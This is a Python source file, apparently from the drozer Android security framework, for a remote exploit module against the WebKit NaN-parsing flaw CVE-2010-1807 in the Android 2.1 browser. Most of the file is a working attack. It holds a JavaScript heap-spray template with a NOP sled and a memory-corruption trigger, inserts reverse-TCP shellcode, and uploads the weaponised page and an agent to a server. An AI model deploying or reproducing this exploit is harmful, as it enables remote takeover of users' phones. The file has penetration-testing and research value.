from drozer.exploit.payload import Weasel
from drozer.modules import Module
from drozer.server import uploader

class NaNParse(Module):

    name = "Webkit Invalid NaN Parsing - CVE-2010-180"
    description = """
    CVE-2010-1807 (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1807)
    """
    examples = ""
    author = ["MJ Keith", "Itzhak Avraham", "Tyrone (@mwrlabs)"]
    date = "2013-06-22"
    license = "BSD (3 clause)"
    module_type = "exploit"
    path = ["exploit", "remote", "webkit"]
    
    targets = { 0 : ".*Android.*2\.1.*AppleWebKit.*",}
    payloads = ["weasel.reverse_tcp.armeabi", "shell.reverse_tcp.armeabi"]
    working_dir = "/data/data/com.android.browser"
    
    __template = """
    <html>
    <head>
    <script>
    function trigger() {
        var span = document.createElement("div");
        document.getElementById("BodyID").appendChild(span);
        span.innerHTML = -parseFloat("NAN(ffffe00572c60)"); //memory corruption when handling invalid values
    }
    
    function exploit() {
        var nop = unescape("\u33bc\u0057"); //LDREQH R3,[R7],-0x3C for nopping
        do {
            nop += nop;
        } while (nop.length <= 0x1000);
        
        var scode = nop + unescape("xxx");

        target = new Array();
        for(i=0; i<0x1000; i++)
            target[i] = scode;
            
        for(i=0; i<=0x1000; i++) {
            document.write(target[i] + "<i>");
            if(i > 0x999)
                trigger();
        }
    }
    </script>
    </head>
    <body id="BodyID">
        <br />
        <script>
            exploit();
        </script>
    </body>
    </html>
    """
    
    def __init__(self, session, loader):
        Module.__init__(self, session)
        
        self.__loader = loader
    
    def execute(self, arguments):
        """
        Implementation of the Module execute() method. Requests that the shell
        code is generated, before formatting it and printing to stdout.
        """
        
        if not arguments.shellcode in self.payloads:
            self.stderr.write("unsupported shellcode: " + arguments.shellcode + "\n")
            return
        
        arguments.format = 'U'
        
        shellcode = self.__loader.get(arguments.shellcode)(None).execute(arguments)
        
        self.generate(arguments, shellcode)
    
    def generate(self, arguments, shellcode):
        exploit = self.__template.replace("xxx", shellcode)
        
        print "Uploading weasel to W..."
        uploader.upload(arguments, "/weasel", Weasel().build(arguments), magic="W")
        
        print "Uploading Exploit to /nanparse.html..."
        uploader.upload(arguments, "/nanparse.html", exploit)
        